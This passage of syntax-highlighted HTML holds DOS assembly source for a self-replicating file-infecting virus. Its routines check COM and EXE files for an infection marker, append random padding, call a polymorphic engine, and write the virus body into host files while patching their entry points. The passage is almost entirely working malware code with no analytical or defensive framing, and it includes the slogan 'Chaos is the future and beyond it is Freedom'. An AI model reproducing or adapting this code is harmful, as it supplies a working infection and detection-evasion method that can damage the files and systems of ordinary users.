                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">goat_word</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closing</span><span class="sc0">                 </span><span class="sc1">; is the same word at 02h ?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; check MZ</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exestuff</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; check ZM</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exestuff</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">      </span><span class="sc1">; jump in com?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cominf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ffh</span><span class="sc0">                 </span><span class="sc1">; bytes to check</span><span class="sc0">

</span><span class="sc5">signature_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'PS'</span><span class="sc0">   </span><span class="sc1">; look for our marker</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_one</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closing</span><span class="sc0">
</span><span class="sc5">next_one</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">signature_check</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">cominf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cominfect</span><span class="sc0">               </span><span class="sc1">; infect com file</span><span class="sc0">
</span><span class="sc5">exestuff</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">   </span><span class="sc1">; no winexes</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closing</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'PS'</span><span class="sc0">                 </span><span class="sc1">; check for infection marker</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closing</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; internal ovl</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">closing</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exeinfect</span><span class="sc0">               </span><span class="sc1">; infect .exe file</span><span class="sc0">
</span><span class="sc5">closing</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0157h</span><span class="sc0">                </span><span class="sc1">; set date/time</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
</span><span class="sc5">oh_shit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attr</span><span class="sc0">                </span><span class="sc1">; reput old attributes</span><span class="sc0">
</span><span class="sc5">oh_shit2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                </span><span class="sc1">; restore int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

</span><span class="sc5">restore_registers</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">goint21</span><span class="sc0">


</span><span class="sc5">cominfect</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;com infection routine</span><span class="sc0">
        </span><span class="sc1">;bx &lt;-- filehandle</span><span class="sc0">
        </span><span class="sc1">;si --&gt; exeheader</span><span class="sc0">
        </span><span class="sc1">;cs=ds=code</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; get dos version</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">          </span><span class="sc1">; is &gt;= 7 ?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">exitcominfect</span><span class="sc0">   </span><span class="sc1">; if so, no COMs, sry :)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; copy original 3 bytes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_jump</span><span class="sc0">     </span><span class="sc1">; in old_jump</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; store word for cmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">goat_word</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">getrndi</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; where to put our marker</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">getrndi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; it will go from 04 to 1feh</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; save old word</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_two_rnd</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'PS'</span><span class="sc0">           </span><span class="sc1">; put our marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                          </span><span class="sc1">; lseek at end</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C0DEh</span><span class="sc0">                       </span><span class="sc1">; AX &gt; 49374?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exitcominfect</span><span class="sc0">                   </span><span class="sc1">; JMP if &gt;</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_end</span><span class="sc0">                         </span><span class="sc1">; put some shit on end</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; sub the jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; new jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">isexe</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">              </span><span class="sc1">; mark as com</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">; run offset</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; virus starts at seg:0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; can play with es</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">smpe</span><span class="sc0">                    </span><span class="sc1">; call poly</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">poly_exit_ok</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; restore stack</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closing</span><span class="sc0">
</span><span class="sc5">poly_exit_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write virus</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; go at start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                </span><span class="sc1">; write first 512 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exeheader</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

</span><span class="sc5">exitcominfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closing</span><span class="sc0">

</span><span class="sc5">movefile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; move to start or end</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">add_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">randi_add</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; at least 1 byte</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">randi_add</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; random "From:" place</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; how much pure shit :-)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write to file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">; add to lenght</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">phrase</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Chaos is the future and beyond it is Freedom'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;bx &lt;- filehandle</span><span class="sc0">
        </span><span class="sc1">;si -&gt; exeheader</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; calculate real lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; compare lseek length with</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">oki_lenght</span><span class="sc0">
</span><span class="sc5">exit_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">oki_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; lenght loaded by the loader</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exit_lenght</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_end</span><span class="sc0">                 </span><span class="sc1">; put some shit at end</span><span class="sc0">

                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; store length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store old IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infip</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store old CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infcs</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store old SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infsp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store old SS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infss</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; new cs:ip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'PS'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; modify marker</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">; store marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

